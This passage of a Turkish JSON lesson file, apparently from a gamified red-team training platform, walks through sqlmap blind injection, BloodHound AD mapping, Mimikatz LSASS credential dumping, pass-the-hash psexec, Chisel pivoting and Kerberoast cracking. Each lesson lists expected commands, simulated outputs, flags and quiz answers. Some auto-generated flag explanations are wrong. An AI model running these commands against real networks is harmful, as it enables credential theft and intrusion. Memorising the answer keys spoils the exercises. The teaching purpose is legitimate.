            },
            {
                "snippet": "[*] retrieved query response latency: 5.02s",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            }
        ],
        "beginnerTerms": [
            {
                "term": "sqlmap",
                "desc": "SQLi İleri Düzey: Time-Based & Blind SQL Injection görevinde kullanılan temel siber güvenlik ve sistem analiz aracıdır."
            }
        ],
        "quickCheck": {
            "question": "Bu odada çalıştırdığımız `sqlmap -u 'http://target.local/item?id=1' --technique=T --batch --current-db` komutunun temel amacı nedir?",
            "options": [
                "sqlmap aracını kullanarak zaman tabanlı körleme tekniğiyle veritabanı adını çekmek için sqlmap -u 'http://target.local/item?id=1' --technique=T --batch --current-db",
                "Bilgisayarın ekran kartı sürücüsünü güncellemek",
                "Sistemi tamamen silip yeniden başlatmak"
            ],
            "answer": 0,
            "explanation": "Doğru! `sqlmap -u 'http://target.local/item?id=1' --technique=T --batch --current-db` komutu ezbere yazılan bir kod değil; --technique=T: Yalnızca Time-Based Blind (Zaman Gecikmeli) tekniğini uygular. --current-db: Aktif veritabanının adını harf harf çıkarır."
        }
    },
    {
        "id": "red-307",
        "track": "red",
        "title": "Active Directory: BloodHound ile En Kısa Domain Admin Yolu",
        "level": "3. Red Team Yetkinlikleri",
        "badge": "BLOODHOUND & GRAPH RECON",
        "theory": "### Active Directory Labirentini Çözmek: BloodHound ve Grafik Teorisi\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nDevasa bir gökdelende en alt kattaki stajyerin odasından en üst kattaki CEO'nun anahtarına giden gizli kapıları gösteren 3 boyutlu mimari haritadır. Bir kullanıcının hangi gruba üye olduğu, o grubun hangi bilgisayarda 'GenericAll' yetkisine sahip olduğu gibi karmaşık ilişkileri haritalar.\n\n#### Cypher Sorguları:\nBloodHound, Neo4j veritabanını kullanarak `Find Shortest Paths to Domain Admins` sorgusuyla 10 adımda stajyerden Domain Admin tahtına giden zafiyetli zinciri saniyede bulur.",
        "mission": "corp.local etki alanındaki tüm kullanıcı, grup ve ACL ilişkilerini çekmek için bloodhound-python -u analyst -p Pass123! -d corp.local -c All -ns 10.10.1.5 komutunu çalıştırın.",
        "expectedCommand": "bloodhound-python -u analyst -p Pass123! -d corp.local -c All -ns 10.10.1.5",
        "acceptedCommands": [
            "bloodhound-python -u analyst -p Pass123! -d corp.local -c All -ns 10.10.1.5",
            "bloodhound-python -u analyst -p Pass123! -d corp.local -c All",
            "bloodhound-python -u analyst -p 'Pass123!' -d corp.local -c All -ns 10.10.1.5"
        ],
        "hintExplanation": "<p><strong>bloodhound-python:</strong> Linux üzerinden AD nesnelerini toplayan SharpHound alternatifidir.</p><p><strong>-c All:</strong> Tüm oturum, grup, ACL ve konteyner verilerini toplar.</p>",
        "terminalSuccessOutput": "[+] Connecting to LDAP server: 10.10.1.5\n[+] Found 452 users, 84 groups, 120 computers\n[+] Dumping domain trust relationships...\n[+] WriteDacl on 'Tier-1-Admins' -> GenericAll on 'Domain Admins'\n[+] SHORTEST PATH TO DOMAIN ADMIN: 3 HOP BULUNDU!\n[FLAG] LFL{red_bloodhound_shortest_path_to_da_mapped}",
        "flag": "LFL{red_bloodhound_shortest_path_to_da_mapped}",
        "nextId": "red-308",
        "whyWeUse": "**Ezberlemeden Önce Mantığını Anla:** Gerçek bir siber güvenlik operasyonunda (3. Red Team Yetkinlikleri) binlerce satırlık veriyi veya karmaşık sistem ayarlarını gözle kontrol etmek imkansızdır. Bu odada `bloodhound-python -u analyst -p Pass123! -d corp.local -c All -ns 10.10.1.5` komutunu kullanmamızın sebebi; **Active Directory: BloodHound ile En Kısa Domain Admin Yolu** senaryosunda aradığımız kritik kanıtı, açık kapıyı veya güvenlik zafiyetini doğrudan işletim sistemi çekirdeğinden/loglarından hatasız şekilde çekmektir. bloodhound-python: Linux üzerinden AD nesnelerini toplayan SharpHound alternatifidir. -c All: Tüm oturum, grup, ACL ve konteyner verilerini toplar.",
        "cmdAnatomy": [
            {
                "token": "bloodhound-python",
                "role": "Ana Siber Araç / Komut",
                "desc": "Bu görevde çalıştırdığımız ana güvenlik veya sistem aracı (bloodhound-python)."
            },
            {
                "token": "-u",
                "role": "Komut Parametresi (Flag)",
                "desc": "Komutun çalışma davranışını özelleştiren ve detaylı analiz modunu açan parametre (-u)."
            },
            {
                "token": "analyst",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (analyst)."
            },
            {
                "token": "-p",
                "role": "Parametre (Port Seçimi)",
                "desc": "65.535 portun tamamını taramak yerine sadece belirttiğin kapı numaralarını kontrol etmesini sağlar."
            },
            {
                "token": "Pass123!",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (Pass123!)."
            },
            {
                "token": "-d",
                "role": "Komut Parametresi (Flag)",
                "desc": "Komutun çalışma davranışını özelleştiren ve detaylı analiz modunu açan parametre (-d)."
            },
            {
                "token": "corp.local",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (corp.local)."
            },
            {
                "token": "-c",
                "role": "Parametre (Count / Adet)",
                "desc": "Kaç adet test paketi gönderileceğini belirler (Linux'ta bunu yazmazsan ping sonsuza kadar devam eder)."
            },
            {
                "token": "All",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (All)."
            },
            {
                "token": "-ns",
                "role": "Komut Parametresi (Flag)",
                "desc": "Komutun çalışma davranışını özelleştiren ve detaylı analiz modunu açan parametre (-ns)."
            },
            {
                "token": "10.10.1.5",
                "role": "Hedef IP / Ağ Adresi",
                "desc": "İşlemin uygulanacağı hedef makinenin veya ağın IP adresi (10.10.1.5)."
            }
        ],
        "outputGuide": [
            {
                "snippet": "[+] Connecting to LDAP server: 10.10.1.5",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "[+] Found 452 users, 84 groups, 120 computers",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "[+] Dumping domain trust relationships...",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "[+] WriteDacl on 'Tier-1-Admins' -> GenericAll on 'Domain Admins'",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            }
        ],
        "beginnerTerms": [
            {
                "term": "bloodhound-python",
                "desc": "Active Directory: BloodHound ile En Kısa Domain Admin Yolu görevinde kullanılan temel siber güvenlik ve sistem analiz aracıdır."
            }
        ],
        "quickCheck": {
            "question": "Bu odada çalıştırdığımız `bloodhound-python -u analyst -p Pass123! -d corp.local -c All -ns 10.10.1.5` komutunun temel amacı nedir?",
            "options": [
                "corp.local etki alanındaki tüm kullanıcı, grup ve ACL ilişkilerini çekmek için bloodhound-python -u analyst -p Pass123! -d corp.local -c All -ns 10.10.1.5",
                "Bilgisayarın ekran kartı sürücüsünü güncellemek",
                "Sistemi tamamen silip yeniden başlatmak"
            ],
            "answer": 0,
            "explanation": "Doğru! `bloodhound-python -u analyst -p Pass123! -d corp.local -c All -ns 10.10.1.5` komutu ezbere yazılan bir kod değil; bloodhound-python: Linux üzerinden AD nesnelerini toplayan SharpHound alternatifidir. -c All: Tüm oturum, grup, ACL ve konteyner verilerini toplar."
        }
    },
    {
        "id": "red-308",
        "track": "red",
        "title": "Bellek İstismarı: Mimikatz & LSASS Dump Parola Avcılığı",
        "level": "3. Red Team Yetkinlikleri",
        "badge": "LSASS MEMORY & CREDENTIAL DUMP",
        "theory": "### Belleğin Gizli Odası: LSASS ve Açık Parolalar\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nOtel resepsiyonundaki görevli, müşterilerin anahtarlarını daha sonra hızlıca bulabilmek için masanın çekmecesine koyar. Mimikatz, o çekmeceye elini daldırıp lobide oturum açmış herkesin oda anahtarını (NTLM hash ve Kerberos biletleri) cebine dolduran araçtır.\n\n#### LSASS Korumaları ve Bypass:\nModern Windows sistemlerde LSASS koruması (RunAsPPL) olsa dahi, Red Team uzmanları mini-dump (Procdump, comsvcs.dll) veya kernel sürücüleri ile belleği diske döküp çevrimdışı Mimikatz ile analiz edebilir.",
        "mission": "Mimikatz ile SeDebugPrivilege yetkisini alıp oturum açmış kullanıcıların kimlik bilgilerini bellekten dökmek için mimikatz.exe 'privilege::debug' 'sekurlsa::logonpasswords' exit komutunu çalıştırın.",
        "expectedCommand": "mimikatz.exe 'privilege::debug' 'sekurlsa::logonpasswords' exit",
        "acceptedCommands": [
            "mimikatz.exe 'privilege::debug' 'sekurlsa::logonpasswords' exit",
            "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit",
            "mimikatz privilege::debug sekurlsa::logonpasswords exit"
        ],
        "hintExplanation": "<p><strong>privilege::debug:</strong> İşletim sistemi çekirdek proseslerine dokunma yetkisini aktifleştirir.</p><p><strong>sekurlsa::logonpasswords:</strong> LSASS belleğindeki aktif NTLM hash'lerini ve açık metin parolaları listeler.</p>",
        "terminalSuccessOutput": "  .#####.   mimikatz 2.2.0 (x64) # release\n ## ^ ##    \"A La Vie, A L'Amour\"\nPrivilege '20' OK\nAuthentication Id : 0 ; 249124 (00000000:0003cd24)\nUser Name         : Administrator\nDomain            : CORP\n * NTLM : b4b9b02e6f09a9bd760f388b67351e2b\n[KRİTİK BAŞARI] Administrator kullanıcısının NTLM hash'i LSASS'tan çekildi!\n[FLAG] LFL{red_mimikatz_lsass_passwords_dumped}",
        "flag": "LFL{red_mimikatz_lsass_passwords_dumped}",
        "nextId": "red-309",
        "whyWeUse": "**Ezberlemeden Önce Mantığını Anla:** Gerçek bir siber güvenlik operasyonunda (3. Red Team Yetkinlikleri) binlerce satırlık veriyi veya karmaşık sistem ayarlarını gözle kontrol etmek imkansızdır. Bu odada `mimikatz.exe 'privilege::debug' 'sekurlsa::logonpasswords' exit` komutunu kullanmamızın sebebi; **Bellek İstismarı: Mimikatz & LSASS Dump Parola Avcılığı** senaryosunda aradığımız kritik kanıtı, açık kapıyı veya güvenlik zafiyetini doğrudan işletim sistemi çekirdeğinden/loglarından hatasız şekilde çekmektir. privilege::debug: İşletim sistemi çekirdek proseslerine dokunma yetkisini aktifleştirir. sekurlsa::logonpasswords: LSASS belleğindeki aktif NTLM hash'lerini ve açık metin parolaları listeler.",
        "cmdAnatomy": [
            {
                "token": "mimikatz.exe",
                "role": "Dosya / Klasör Yolu",
                "desc": "Üzerinde okuma, analiz veya işlem yapılacak hedef dosya/klasör (mimikatz.exe)."
            },
            {
                "token": "'privilege::debug'",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman ('privilege::debug')."
            },
            {
                "token": "'sekurlsa::logonpasswords'",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman ('sekurlsa::logonpasswords')."
            },
            {
                "token": "exit",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (exit)."
            }
        ],
        "outputGuide": [
            {
                "snippet": ".#####.   mimikatz 2.2.0 (x64) # release",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "## ^ ##    \"A La Vie, A L'Amour\"",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "Privilege '20' OK",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "Authentication Id : 0 ; 249124 (00000000:0003cd24)",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            }
        ],
        "beginnerTerms": [
            {
                "term": "mimikatz.exe",
                "desc": "Bellek İstismarı: Mimikatz & LSASS Dump Parola Avcılığı görevinde kullanılan temel siber güvenlik ve sistem analiz aracıdır."
            }
        ],
        "quickCheck": {
            "question": "Bu odada çalıştırdığımız `mimikatz.exe 'privilege::debug' 'sekurlsa::logonpasswords' exit` komutunun temel amacı nedir?",
            "options": [
                "Mimikatz ile SeDebugPrivilege yetkisini alıp oturum açmış kullanıcıların kimlik bilgilerini bellekten dökmek için mimikatz.exe 'privilege::debug' 'sekurlsa::logonpasswords' exit",
                "Bilgisayarın ekran kartı sürücüsünü güncellemek",
                "Sistemi tamamen silip yeniden başlatmak"
            ],
            "answer": 0,
            "explanation": "Doğru! `mimikatz.exe 'privilege::debug' 'sekurlsa::logonpasswords' exit` komutu ezbere yazılan bir kod değil; privilege::debug: İşletim sistemi çekirdek proseslerine dokunma yetkisini aktifleştirir. sekurlsa::logonpasswords: LSASS belleğindeki aktif NTLM hash'lerini ve açık metin parolaları listeler."
        }
    },
    {
        "id": "red-309",
        "track": "red",
        "title": "Ağ İçi Yatay Geçiş: Pass-the-Hash & Impacket psexec",
        "level": "3. Red Team Yetkinlikleri",
        "badge": "PASS-THE-HASH & LATERAL MOVEMENT",
        "theory": "### Parolayı Kırmaya Gerek Yok: Hash ile Oturum Açma (PtH)\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nKasanın şifresinin ne olduğunu bilmenize gerek yoktur. Şifreyi temsil eden onay damgasını elinize geçirip kapıdaki kontrolöre gösterdiğinizde kapı açılır. NTLM protokolünde sunucu açık metin parolayı değil, hash'i doğrular.\n\n#### Impacket psexec:\nEle geçirilen `Administrator` NTLM hash'i doğrudan SMB üzerinden diğer hedef sunucuya iletilerek o makinede `SYSTEM` yetkisinde uzaktan komut kabuğu (shell) açılır.",
        "mission": "Ele geçirilen NTLM hash'ini kullanarak iç ağdaki 10.10.10.50 sunucusuna Pass-the-Hash ile bağlanıp whoami çalıştırmak için impacket-psexec -hashes :b4b9b02e6f09a9bd760f388b67351e2b Administrator@10.10.10.50 whoami komutunu çalıştırın.",
        "expectedCommand": "impacket-psexec -hashes :b4b9b02e6f09a9bd760f388b67351e2b Administrator@10.10.10.50 whoami",
        "acceptedCommands": [
            "impacket-psexec -hashes :b4b9b02e6f09a9bd760f388b67351e2b Administrator@10.10.10.50 whoami",
            "psexec.py -hashes :b4b9b02e6f09a9bd760f388b67351e2b Administrator@10.10.10.50 whoami",
            "impacket-psexec -hashes :b4b9b02e6f09a9bd760f388b67351e2b Administrator@10.10.10.50"
        ],
        "hintExplanation": "<p><strong>impacket-psexec:</strong> Windows SMB servisleri üzerinden servis yükleyip kabuk açar.</p><p><strong>-hashes:</strong> Açık parola yerine NTLM hash ile giriş yapmayı sağlar.</p>",
        "terminalSuccessOutput": "[*] Requesting shares on 10.10.10.50.....\n[*] Found writable share ADMIN$\n[*] Uploading file kxLq.exe.....\n[*] Opening SVCManager on 10.10.10.50.....\n[*] Creating service kxLq on 10.10.10.50.....\n[*] Starting service kxLq.....\nnt authority\\system\n[YATAY GEÇİŞ BAŞARILI] 10.10.10.50 sunucusu SYSTEM yetkisiyle ele geçirildi!\n[FLAG] LFL{red_pass_the_hash_lateral_movement_success}",
        "flag": "LFL{red_pass_the_hash_lateral_movement_success}",
        "nextId": "red-310",
        "whyWeUse": "**Ezberlemeden Önce Mantığını Anla:** Gerçek bir siber güvenlik operasyonunda (3. Red Team Yetkinlikleri) binlerce satırlık veriyi veya karmaşık sistem ayarlarını gözle kontrol etmek imkansızdır. Bu odada `impacket-psexec -hashes :b4b9b02e6f09a9bd760f388b67351e2b Administrator@10.10.10.50 whoami` komutunu kullanmamızın sebebi; **Ağ İçi Yatay Geçiş: Pass-the-Hash & Impacket psexec** senaryosunda aradığımız kritik kanıtı, açık kapıyı veya güvenlik zafiyetini doğrudan işletim sistemi çekirdeğinden/loglarından hatasız şekilde çekmektir. impacket-psexec: Windows SMB servisleri üzerinden servis yükleyip kabuk açar. -hashes: Açık parola yerine NTLM hash ile giriş yapmayı sağlar.",
        "cmdAnatomy": [
            {
                "token": "impacket-psexec",
                "role": "Ana Siber Araç / Komut",
                "desc": "Bu görevde çalıştırdığımız ana güvenlik veya sistem aracı (impacket-psexec)."
            },
            {
                "token": "-hashes",
                "role": "Komut Parametresi (Flag)",
                "desc": "Komutun çalışma davranışını özelleştiren ve detaylı analiz modunu açan parametre (-hashes)."
            },
            {
                "token": ":b4b9b02e6f09a9bd760f388b67351e2b",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (:b4b9b02e6f09a9bd760f388b67351e2b)."
            },
            {
                "token": "Administrator@10.10.10.50",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (Administrator@10.10.10.50)."
            },
            {
                "token": "whoami",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (whoami)."
            }
        ],
        "outputGuide": [
            {
                "snippet": "[*] Requesting shares on 10.10.10.50.....",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "[*] Found writable share ADMIN$",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "[*] Uploading file kxLq.exe.....",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "[*] Opening SVCManager on 10.10.10.50.....",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            }
        ],
        "beginnerTerms": [
            {
                "term": "Administrator",
                "desc": "Bu odadaki (Ağ İçi Yatay Geçiş: Pass-the-Hash & Impacket psexec) senaryoda kullanılan ve sistemin ilgili bileşenini/parametresini ifade eden teknik kavramdır."
            },
            {
                "term": "SYSTEM",
                "desc": "Bu odadaki (Ağ İçi Yatay Geçiş: Pass-the-Hash & Impacket psexec) senaryoda kullanılan ve sistemin ilgili bileşenini/parametresini ifade eden teknik kavramdır."
            }
        ],
        "quickCheck": {
            "question": "Bu odada çalıştırdığımız `impacket-psexec -hashes :b4b9b02e6f09a9bd760f388b67351e2b Administrator@10.10.10.50 whoami` komutunun temel amacı nedir?",
            "options": [
                "Ele geçirilen NTLM hash'ini kullanarak iç ağdaki 10.10.10.50 sunucusuna Pass-the-Hash ile bağlanıp whoami çalıştırmak için impacket-psexec -hashes :b4b9b02e6f09a9bd760f388b67351e2b Administrator@10.10.10.50 whoami",
                "Bilgisayarın ekran kartı sürücüsünü güncellemek",
                "Sistemi tamamen silip yeniden başlatmak"
            ],
            "answer": 0,
            "explanation": "Doğru! `impacket-psexec -hashes :b4b9b02e6f09a9bd760f388b67351e2b Administrator@10.10.10.50 whoami` komutu ezbere yazılan bir kod değil; impacket-psexec: Windows SMB servisleri üzerinden servis yükleyip kabuk açar. -hashes: Açık parola yerine NTLM hash ile giriş yapmayı sağlar."
        }
    },
    {
        "id": "red-310",
        "track": "red",
        "title": "Ağ Pivotlama: Chisel & SOCKS5 Tünelleme ile İç Ağ Fethi",
        "level": "3. Red Team Yetkinlikleri",
        "badge": "NETWORK PIVOTING & SOCKS5",
        "theory": "### Görünmez Ağlara Ulaşmak: Pivotlama (Pivoting)\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nDışarıdan yalnızca oturma odasının penceresini görebiliyorsunuz. Ancak oturma odasına bir telsiz (Chisel Client) kurup telsizi kendi kulaklığınıza (Chisel Server) bağlarsanız, oturma odasından arka yatak odasına seslenebilirsiniz.\n\n#### Chisel HTTP Tünelleme:\nFirewall giden tüm portları kapatsa bile genellikle port 80 veya 443'e izin verir. Chisel bu HTTP tüneli içine tam teşekküllü bir SOCKS5 proxy sığdırarak Kali makinenizdeki `nmap` veya `burp`'un iç ağdaki 172.16.0.0/24 bloklarını taramasını sağlar.",
        "mission": "DMZ sunucusundan kendi saldırı makinenize tersine SOCKS5 proxy tüneli açmak için chisel client 10.10.10.5:8000 R:socks komutunu çalıştırın.",
        "expectedCommand": "chisel client 10.10.10.5:8000 R:socks",
        "acceptedCommands": [
            "chisel client 10.10.10.5:8000 R:socks",
            "chisel client 10.10.10.5:8000 R:1080:socks",
            "./chisel client 10.10.10.5:8000 R:socks"
        ],
        "hintExplanation": "<p><strong>chisel client:</strong> Ele geçirilen hedef makinede çalıştırılan istemcidir.</p><p><strong>R:socks:</strong> Sunucu tarafında 1080 numaralı yerel SOCKS5 proxy portu açar.</p>",
        "terminalSuccessOutput": "2026/11/08 21:05:10 client: Connecting to ws://10.10.10.5:8000\n2026/11/08 21:05:11 client: Handshaking...\n2026/11/08 21:05:11 client: Sending config\n2026/11/08 21:05:11 client: Connected (Latency 1.4ms)\n2026/11/08 21:05:11 client: SOCKS5 tunnel established on 127.0.0.1:1080\n[TÜNEL DEVREDE] Artık proxychains ile iç ağdaki izole veritabanları taranabilir!\n[FLAG] LFL{red_pivoting_chisel_socks5_internal_network_unlocked}",
        "flag": "LFL{red_pivoting_chisel_socks5_internal_network_unlocked}",
        "nextId": "red-311",
        "whyWeUse": "**Ezberlemeden Önce Mantığını Anla:** Gerçek bir siber güvenlik operasyonunda (3. Red Team Yetkinlikleri) binlerce satırlık veriyi veya karmaşık sistem ayarlarını gözle kontrol etmek imkansızdır. Bu odada `chisel client 10.10.10.5:8000 R:socks` komutunu kullanmamızın sebebi; **Ağ Pivotlama: Chisel & SOCKS5 Tünelleme ile İç Ağ Fethi** senaryosunda aradığımız kritik kanıtı, açık kapıyı veya güvenlik zafiyetini doğrudan işletim sistemi çekirdeğinden/loglarından hatasız şekilde çekmektir. chisel client: Ele geçirilen hedef makinede çalıştırılan istemcidir. R:socks: Sunucu tarafında 1080 numaralı yerel SOCKS5 proxy portu açar.",
        "cmdAnatomy": [
            {
                "token": "chisel",
                "role": "Ana Siber Araç / Komut",
                "desc": "Bu görevde çalıştırdığımız ana güvenlik veya sistem aracı (chisel)."
            },
            {
                "token": "client",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (client)."
            },
            {
                "token": "10.10.10.5:8000",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (10.10.10.5:8000)."
            },
            {
                "token": "R:socks",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (R:socks)."
            }
        ],
        "outputGuide": [
            {
                "snippet": "2026/11/08 21:05:10 client: Connecting to ws://10.10.10.5:8000",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "2026/11/08 21:05:11 client: Handshaking...",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "2026/11/08 21:05:11 client: Sending config",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "2026/11/08 21:05:11 client: Connected (Latency 1.4ms)",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            }
        ],
        "beginnerTerms": [
            {
                "term": "nmap",
                "desc": "Siber güvenliğin en temel keşif aracıdır. Hedef bilgisayara paketler göndererek hangi portların açık olduğunu ve hangi servislerin çalıştığını tespit eder."
            },
            {
                "term": "burp",
                "desc": "Bu odadaki (Ağ Pivotlama: Chisel & SOCKS5 Tünelleme ile İç Ağ Fethi) senaryoda kullanılan ve sistemin ilgili bileşenini/parametresini ifade eden teknik kavramdır."
            }
        ],
        "quickCheck": {
            "question": "Bu odada çalıştırdığımız `chisel client 10.10.10.5:8000 R:socks` komutunun temel amacı nedir?",
            "options": [
                "DMZ sunucusundan kendi saldırı makinenize tersine SOCKS5 proxy tüneli açmak için chisel client 10.10.10.5:8000 R:socks",
                "Bilgisayarın ekran kartı sürücüsünü güncellemek",
                "Sistemi tamamen silip yeniden başlatmak"
            ],
            "answer": 0,
            "explanation": "Doğru! `chisel client 10.10.10.5:8000 R:socks` komutu ezbere yazılan bir kod değil; chisel client: Ele geçirilen hedef makinede çalıştırılan istemcidir. R:socks: Sunucu tarafında 1080 numaralı yerel SOCKS5 proxy portu açar."
        }
    },
    {
        "id": "red-311",
        "track": "red",
        "title": "Parola Kırma: Hashcat ile Kerberoasting TGS Offline Crack",
        "level": "3. Red Team Yetkinlikleri",
        "badge": "GPU HASHCAT CRACKING",
        "theory": "### Matematiksel Güç: GPU Destekli Hash Kırma\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nElinizde bir banka kasasının şifreli anahtarı var ama anahtarın dişleri mühürlü. Korumalar sizi görmesin diye anahtarı kendi garajınıza getirip saniyede 5 milyar deneme yapan hidrolik lazer makinenizle (GPU) kırana kadar test etmek gibidir.\n\n#### Hashcat Modları:\nKerberoasting ile çekilen TGS biletleri Kerberos 5 TGS-REP etype 23 formatındadır (`-m 13100`). Hashcat GPU çekirdeklerini kullanarak RockYou sözlüğündeki parolaları bu biletle saniyeler içinde eşleştirir.",
        "mission": "Ele geçirilen tgs_ticket.hash dosyasını RockYou sözlüğüyle kırmak için hashcat -m 13100 -a 0 tgs_ticket.hash /usr/share/wordlists/rockyou.txt komutunu çalıştırın.",
        "expectedCommand": "hashcat -m 13100 -a 0 tgs_ticket.hash /usr/share/wordlists/rockyou.txt",
        "acceptedCommands": [
            "hashcat -m 13100 -a 0 tgs_ticket.hash /usr/share/wordlists/rockyou.txt",
            "hashcat -m 13100 tgs_ticket.hash /usr/share/wordlists/rockyou.txt",
            "hashcat -m 13100 -a 0 tgs_ticket.hash rockyou.txt"
        ],
        "hintExplanation": "<p><strong>-m 13100:</strong> Kerberos 5 TGS-REP etype 23 hash formatını seçer.</p><p><strong>-a 0:</strong> Düz sözlük (Dictionary) saldırı modudur.</p>",
        "terminalSuccessOutput": "hashcat (v6.2.6) starting in benchmark mode...\nSpeed.#1.........: 1240.2 MH/s (52.12ms)\n$krb5tgs$23$*sql_svc$CORP.LOCAL*$tgs_ticket...:Summer2026!Password\n\nSession..........: hashcat\nStatus...........: Cracked\nHash.Name........: Kerberos 5 TGS-REP etype 23\nCandidates.#1....: 14344384/14344384 (100.00%)\n[PAROLA KIRILDI] sql_svc servis hesabının parolası bulundu: Summer2026!Password\n[FLAG] LFL{red_hashcat_kerberoast_password_cracked}",
        "flag": "LFL{red_hashcat_kerberoast_password_cracked}",
        "nextId": "red-312",
        "whyWeUse": "**Ezberlemeden Önce Mantığını Anla:** Gerçek bir siber güvenlik operasyonunda (3. Red Team Yetkinlikleri) binlerce satırlık veriyi veya karmaşık sistem ayarlarını gözle kontrol etmek imkansızdır. Bu odada `hashcat -m 13100 -a 0 tgs_ticket.hash /usr/share/wordlists/rockyou.txt` komutunu kullanmamızın sebebi; **Parola Kırma: Hashcat ile Kerberoasting TGS Offline Crack** senaryosunda aradığımız kritik kanıtı, açık kapıyı veya güvenlik zafiyetini doğrudan işletim sistemi çekirdeğinden/loglarından hatasız şekilde çekmektir. -m 13100: Kerberos 5 TGS-REP etype 23 hash formatını seçer. -a 0: Düz sözlük (Dictionary) saldırı modudur.",
        "cmdAnatomy": [
            {
                "token": "hashcat",
                "role": "Ana Siber Araç / Komut",
                "desc": "Bu görevde çalıştırdığımız ana güvenlik veya sistem aracı (hashcat)."
            },
            {
                "token": "-m",
                "role": "Komut Parametresi (Flag)",
                "desc": "Komutun çalışma davranışını özelleştiren ve detaylı analiz modunu açan parametre (-m)."
            },
            {
                "token": "13100",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (13100)."
            },
            {
                "token": "-a",
                "role": "Komut Parametresi (Flag)",
                "desc": "Komutun çalışma davranışını özelleştiren ve detaylı analiz modunu açan parametre (-a)."
            },
            {
                "token": "0",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (0)."
            },
            {
                "token": "tgs_ticket.hash",
                "role": "Parametre Değeri / Hedef",
                "desc": "Komuta verilen arama kelimesi, kural veya hedef argüman (tgs_ticket.hash)."
            },
            {
                "token": "/usr/share/wordlists/rockyou.txt",
                "role": "Dosya / Klasör Yolu",
                "desc": "Üzerinde okuma, analiz veya işlem yapılacak hedef dosya/klasör (/usr/share/wordlists/rockyou.txt)."
            }
        ],
        "outputGuide": [
            {
                "snippet": "hashcat (v6.2.6) starting in benchmark mode...",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "Speed.#1.........: 1240.2 MH/s (52.12ms)",
                "meaning": "Komutun hedef sistemden veya log dosyasından süzüp getirdiği kritik teknik bulgu satırıdır; aradığımız kanıt burada yer alır."
            },
            {
                "snippet": "$krb5tgs$23$*sql_svc$CORP.LOCAL*$tgs_ticket...:Summer2026!Password",
